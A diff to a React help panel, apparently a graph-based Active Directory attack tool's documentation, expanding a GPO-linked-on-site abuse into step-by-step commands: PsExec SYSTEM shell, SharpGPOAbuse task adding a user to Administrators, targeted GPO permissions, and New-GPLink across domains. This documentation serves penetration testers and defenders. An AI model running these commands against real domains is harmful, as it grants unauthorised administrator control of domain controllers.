@@ -43,9 +43,9 @@ const Abuse: FC = () => {
 
             <Typography variant='body1'>Abuse TGT delegation</Typography>
             <Typography variant='body2'>
-                An attacker can coerce a privileged computer (e.g., a DC) in the target domain to authenticate to an
-                attacker-controlled computer configured with unconstrained delegation. This provides the attacker with a
-                Kerberos TGT for the coerced computer.
+                An attacker can coerce a privileged computer (e.g., a domain controller (DC)) in the target domain to
+                authenticate to an attacker-controlled computer configured with unconstrained delegation. This provides
+                the attacker with a Kerberos TGT for the coerced computer.
             </Typography>
             <Typography variant='body2'>
                 Refer to the AbuseTGTDelegation edge documentation under References for more details. The edge describes
@@ -87,25 +87,81 @@ const Abuse: FC = () => {
             </Typography>
             <Typography variant='body1'>GPO linked on Site</Typography>
             <Typography variant='body2'>
-                AD sites are stored in the Configuration NC. An attacker with SYSTEM access to a DC can link a malicious
-                GPO to the site of a any DC in the forest.
+                AD sites are stored in the forest-wide Configuration NC partition, writable by any DC within the forest.
+                An attacker with SYSTEM access to a DC can link a malicious GPO to the site of a any DC in the forest.
+            </Typography>
+
+            <Typography variant='body2'>
+                <b>Step 1: Obtain a SYSTEM session on a DC in the attacker-controlled domain</b>
+                <br />
+                Use PsExec to start a PowerShell terminal as SYSTEM on the DC:
+            </Typography>
+            <Typography component={'pre'}>{'PsExec64.exe -s -i -accepteula powershell'}</Typography>
+
+            <Typography variant='body2'>
+                <b>Step 2: Create a GPO</b>
+                <br />
+                Use the GroupPolicy module of RSAT to create the new GPO:
+            </Typography>
+            <Typography component={'pre'}>{'New-GPO -Name "MyGPO"'}</Typography>
+
+            <Typography variant='body2'>
+                <b>Step 3: Add the compromising setting to the GPO</b>
+                <br />
+                Use SharpGPOAbuse to add a scheduled task that adds a compromised user to the Administrators group:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    '.\\SharpGPOAbuse.exe --AddComputerTask --TaskName "MyTask" --Author "NT AUTHORITY\\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup Administrators /Add DUMPSTER\\tim" --GPOName "MyGPO"'
+                }
+            </Typography>
+
+            <Typography variant='body2'>
+                <b>Step 4: Identify a target DC and it's site</b>
+                <br />
+                Use the ActiveDirectory module of RSAT to query for DCs in the target domain:
+            </Typography>
+            <Typography component={'pre'}>
+                {'Get-ADDomainController -server bastion.local | select Name,Site'}
+            </Typography>
+            <Typography variant='body2'>Look up the site DistinguishedName:</Typography>
+            <Typography component={'pre'}>
+                {'Get-ADReplicationSite Default-First-Site-Name | select DistinguishedName'}
+            </Typography>
+
+            <Typography variant='body2'>
+                <b>Step 5: Set the GPO permissions</b>
+                <br />
+                This step is important to avoid applying the GPO to all computers connected to the site. Use the
+                GroupPolicy module of RSAT to modify the permissions such that Authenticated Users can read the object
+                but only the targeted computer applies the GPO settings:
+            </Typography>
+            <Typography component={'pre'}>
+                {'$GPO = Get-GPO -Name "MyGPO"\n' +
+                    '$GPO | Set-GPPermissions -PermissionLevel GpoRead -TargetName "Authenticated Users" -TargetType Group -Replace\n' +
+                    '$GPO | Set-GPPermissions -PermissionLevel GpoApply -TargetName "BASTION\\bldc01" -TargetType Computer'}
+            </Typography>
+
+            <Typography variant='body2'>
+                <b>Step 6: Link the GPO to the site</b>
+                <br />
+                Use the GroupPolicy module of RSAT to link the GPO to the site:
+            </Typography>
+            <Typography component={'pre'}>
+                {
+                    'New-GPLink -Name "MyGPO" -Target "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=bastion,DC=local" -Server dc01.dumpster.fire'
+                }
             </Typography>
             <Typography variant='body2'>
-                Attack steps:
+                Note that you must specify the server to be the DC where you are running the command, as the command
+                defaults to execute the change on a root domain DC where the compromised DC does not have the
+                permissions to link the GPO.
                 <br />
-                1) Create a malicious GPO in the attacker-controlled domain
                 <br />
-                2) Identify the site name for a target DC
-                <br />
-                3) Obtain a SYSTEM session on a DC in the attacker-controlled domain
-                <br />
-                4) Link the malicious GPO to the target site
-                <br />
-                5) Wait for the GPO to apply on the target DC
-            </Typography>
-            <Typography variant='body2'>
-                Refer to "SID filter as security boundary between domains? (Part 4) - Bypass SID filtering research"
-                under References for more details.
+                Wait until replication has happened and the GPO has applied on the target DC, and log in with
+                Administrators access on the compromised DC. Replication within the same site happens within 15 seconds
+                but runs on 3 hour schedule by default across sites. GPOs are applied on a 90-120 min interval by
+                default.
             </Typography>
         </>
     );
